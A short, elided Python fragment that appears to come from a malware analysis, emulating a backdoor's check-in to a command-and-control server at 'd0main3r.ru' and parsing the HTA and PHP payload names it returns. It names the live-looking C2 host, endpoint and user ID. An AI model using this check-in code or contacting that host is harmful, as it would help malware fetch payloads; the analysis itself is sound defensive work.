...
# XXX with:
host='d0main3r.ru'
url='/universal/makestream.php'
type='http'
userid='ebcfeb6fd2ba683cd986250fa29cdace'
typeofexp='triple'
...
if (response.status==200):
    for line in data.split('\n'):
        if line.startswith('template'):
            ...
            line = line.replace("'", '')
            template = line
        elif line.startswith('htafile'):
            line = line.replace("htafile=", '')
            line = line.replace("'", '')
            htafile = line
        elif line.startswith('phpfile'):
            line = line.replace("phpfile=", '')
            line = line.replace("'", '')
            phpfile = line
...
data = response.read()
if (response.status==200):
    print('backdoor would have executed: ' + data)
else:
    print('backdoor sent nothing')
